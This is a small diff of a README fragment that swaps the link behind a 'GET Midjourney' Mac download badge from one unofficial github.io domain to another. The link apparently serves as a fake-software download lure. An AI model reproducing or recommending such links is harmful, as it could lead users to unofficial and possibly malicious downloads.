@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-applications.github.io/.github/midjourney">  
+<a href="https://osx-app.github.io/.github/midjourney">  
 <img src="https://img.shields.io/badge/💻_GET_Midjourney-orange?style=for-the-badge&logo=apple" alt="GET Midjourney">  
 </a>  
 </div>
